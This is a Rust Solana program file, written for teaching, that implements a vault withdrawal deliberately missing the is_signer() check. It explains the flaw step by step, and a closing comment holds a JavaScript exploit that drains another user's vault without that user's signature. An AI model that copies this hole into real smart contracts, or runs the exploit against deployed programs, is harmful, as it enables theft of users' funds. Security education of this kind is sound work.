//! # VULNERABLE Implementation - Missing Signer Check
//!
//! ⚠️ WARNING: This code is intentionally INSECURE for educational purposes.
//! DO NOT use this pattern in production code!
//!
//! ## The Vulnerability
//! 
//! This implementation fails to call `is_signer()` on the authority account.
//! It only checks that the authority pubkey matches the vault's stored authority,
//! but doesn't verify that the authority actually SIGNED the transaction.
//!
//! ## Critical Missing Code
//! 
//! ```rust
//! // This check is MISSING:
//! if !authority.is_signer() {
//!     return Err(ProgramError::MissingRequiredSignature);
//! }
//! ```
//!
//! ## Attack Scenario
//! 
//! 1. Alice creates a vault and deposits 100 SOL
//! 2. Bob reads Alice's vault data from the blockchain
//! 3. Bob finds Alice's pubkey stored at bytes 8-40 (authority field)
//! 4. Bob crafts a transaction calling withdraw_vulnerable():
//!    - Passes Alice's pubkey as the authority account
//!    - Does NOT sign as Alice (he can't - no private key)
//!    - Sets his own wallet as destination
//! 5. Program checks: authority.key() == vault.authority? YES ✓
//! 6. Program DOESN'T check: authority.is_signer()? SKIPPED ✗
//! 7. Bob steals all of Alice's funds!

use pinocchio::{
    account_info::AccountInfo,
    program_error::ProgramError,
    ProgramResult,
};

use crate::{
    read_pubkey, read_u64, write_u64,
    offsets, VAULT_DISCRIMINATOR,
};

/// ❌ VULNERABLE: Withdraw without signer verification
/// 
/// ## Expected Accounts
/// 
/// | Index | Writable | Signer | Description                    |
/// |-------|----------|--------|--------------------------------|
/// | 0     | Yes      | No     | Vault account                  |
/// | 1     | No       | NO!    | Authority (NOT verified!)      |
/// | 2     | Yes      | No     | Destination for funds          |
///
/// ## Security Flaw
/// 
/// Account 1 (authority) should be marked as Signer, but we never check!
/// The `is_signer` flag exists on the AccountInfo, but we ignore it.
pub fn withdraw_vulnerable(
    accounts: &[AccountInfo],
    amount: u64,
) -> ProgramResult {
    // === ACCOUNT PARSING ===
    if accounts.len() < 3 {
        return Err(ProgramError::NotEnoughAccountKeys);
    }
    
    let vault = &accounts[0];
    let authority = &accounts[1];
    let destination = &accounts[2];
    
    // === MISSING SECURITY CHECK ===
    // 
    // ❌ THE VULNERABILITY IS HERE!
    // 
    // We should have this check, but we don't:
    //
    // if !authority.is_signer() {
    //     return Err(ProgramError::MissingRequiredSignature);
    // }
    //
    // Without this check, ANYONE can pass ANY pubkey as authority
    // and we'll trust it as long as it matches the stored value.
    
    // === VAULT VALIDATION ===
    let vault_data = vault.try_borrow_data()?;
    
    // Check discriminator (prevents type confusion)
    if vault_data[..8] != VAULT_DISCRIMINATOR {
        return Err(ProgramError::InvalidAccountData);
    }
    
    // Read the vault's authority pubkey
    let vault_authority = read_pubkey(&vault_data, offsets::AUTHORITY);
    
    // ❌ INSUFFICIENT CHECK!
    // 
    // This only verifies the pubkey MATCHES - not that they SIGNED!
    // 
    // Analogy: This is like checking someone's name tag matches the
    // reservation list, but not checking their ID to prove they're
    // actually that person!
    if authority.key() != &vault_authority {
        return Err(ProgramError::InvalidAccountData);
    }
    
    // Read current balance
    let balance = read_u64(&vault_data, offsets::BALANCE);
    
    if balance < amount {
        return Err(ProgramError::InsufficientFunds);
    }
    
    // Drop the immutable borrow before mutable operations
    drop(vault_data);
    
    // === DANGER ZONE ===
    // 
    // ❌ At this point, we're about to transfer funds based on
    // UNVERIFIED authorization! The attacker has bypassed security.
    
    // Update vault balance
    let mut vault_data = vault.try_borrow_mut_data()?;
    write_u64(&mut vault_data, offsets::BALANCE, balance - amount);
    drop(vault_data);
    
    // Transfer lamports
    unsafe {
        // Decrease vault lamports
        let vault_lamports = vault.borrow_mut_lamports_unchecked();
        *vault_lamports = (*vault_lamports)
            .checked_sub(amount)
            .ok_or(ProgramError::InsufficientFunds)?;
        
        // Increase destination lamports
        let dest_lamports = destination.borrow_mut_lamports_unchecked();
        *dest_lamports = (*dest_lamports)
            .checked_add(amount)
            .ok_or(ProgramError::ArithmeticOverflow)?;
    }
    
    pinocchio::msg!("⚠️ VULNERABLE: Withdrew {} lamports", amount);
    pinocchio::msg!("⚠️ This withdrawal may have been UNAUTHORIZED!");
    
    Ok(())
}

/*
 * ============================================================================
 * EXPLOIT DEMONSTRATION
 * ============================================================================
 * 
 * Here's exactly how an attacker exploits this vulnerability:
 * 
 * ```javascript
 * // Attacker's code (JavaScript/TypeScript)
 * 
 * // 1. Find a vault with funds (all on-chain data is public)
 * const vaultPubkey = new PublicKey("VaultAddress...");
 * const vaultAccount = await connection.getAccountInfo(vaultPubkey);
 * 
 * // 2. Read the authority pubkey from vault data
 * // Authority is at bytes 8-40 (after discriminator)
 * const authorityPubkey = new PublicKey(vaultAccount.data.slice(8, 40));
 * console.log("Found authority:", authorityPubkey.toBase58());
 * 
 * // 3. Create the exploit instruction
 * // NOTICE: authority is NOT a signer!
 * const exploitIx = new TransactionInstruction({
 *     keys: [
 *         { pubkey: vaultPubkey, isSigner: false, isWritable: true },
 *         { pubkey: authorityPubkey, isSigner: false, isWritable: false }, // NOT SIGNING!
 *         { pubkey: attackerWallet, isSigner: false, isWritable: true },
 *     ],
 *     programId: VULNERABLE_PROGRAM_ID,
 *     data: Buffer.from([
 *         2, // Withdraw instruction
 *         ...new BN(1000000000).toArray("le", 8), // 1 SOL in lamports
 *     ]),
 * });
 * 
 * // 4. Send transaction - attacker signs to pay fees, that's it!
 * const tx = new Transaction().add(exploitIx);
 * await sendAndConfirmTransaction(connection, tx, [attackerKeypair]);
 * 
 * // 5. Check attacker's balance - they got the funds!
 * console.log("Funds stolen successfully!");
 * ```
 * 
 * The vulnerable program accepts this because:
 * - It checks: authorityPubkey == vault.authority ✓ PASSES
 * - It doesn't check: authority.is_signer ✗ NEVER CHECKED
 * 
 * ============================================================================
 */